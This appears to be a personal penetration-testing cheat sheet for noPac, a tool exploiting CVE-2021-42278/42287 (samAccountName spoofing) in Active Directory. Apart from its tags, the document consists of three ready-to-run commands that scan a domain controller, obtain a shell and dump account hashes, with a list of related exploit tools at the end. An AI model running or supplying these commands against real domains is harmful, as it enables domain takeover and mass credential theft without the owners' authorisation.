---
tags: [tool, activedirectory, exploit]
tool: "nopac"
category: "Active Directory"
installed: true
phase: [exploitation]
---

# noPac (CVE-2021-42278/42287)

## Tool Overview
Purpose: Exploit samAccountName spoofing
Location: ~/tools/activedirectory/noPac/

## How to Use It

Check Vulnerability:
noPac.py domain.local/user:pass -dc-ip dc -scan

Get Shell:
noPac.py domain.local/user:pass -dc-ip dc -shell

Dump Hashes:
noPac.py domain.local/user:pass -dc-ip dc -dump

## Related Tools
sam-the-admin, zerologon
